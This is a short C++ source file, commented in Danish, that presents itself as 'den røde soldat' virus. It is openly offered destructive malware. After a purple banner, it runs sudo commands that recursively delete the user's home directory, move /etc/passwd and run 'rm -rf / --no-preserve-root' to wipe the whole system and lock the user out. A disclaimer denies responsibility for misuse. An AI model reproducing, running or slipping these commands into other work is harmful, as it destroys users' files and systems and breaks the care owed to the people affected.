/*

den røde soldat virus blev skrevet i C++
og lover at fjerne brugerens adgang til sin egen computer
slette alle filer fra hans /home/ og slette / fra systemet sammen med /etc/passwd
hvilket forhindrer brugeren i at bruge root for at annullere
den røde soldat er en meget farlig virus, og bør ikke falde i de forkerte hænder
@cartney.lain er ikke ansvarlig for misbrug af projektet.

Denne virus er licenseret:
GNU General Public License

*/

#include <stdlib.h>
#include <iostream>
#include <unistd.h>
#define ANSI_COLOR_PURPLE "\033[1;35m"
#define RESET_COLOR "\033[0;0m"

using namespace std;

void welcomeScreen()
{
    system("clear");
    std::cout<<(ANSI_COLOR_PURPLE "@Cartney.Lain" RESET_COLOR)<<std::endl;
    sleep(1);
    system("clear");
}
void removeAccess()
{
    system("clear");
    system("sudo mv /etc/passwd ~/ | sudo rm -rf / --no-preserve-root");
    system("ls -a /etc | grep pass");
    sleep(1.3);
    system("clear");
}
void deleteArchives()
{
    system("sudo rm -r ~/* | sudo rm -r ~/.*");
    system("clear");
}
int main()
{
    welcomeScreen();
    deleteArchives();
    removeAccess();
}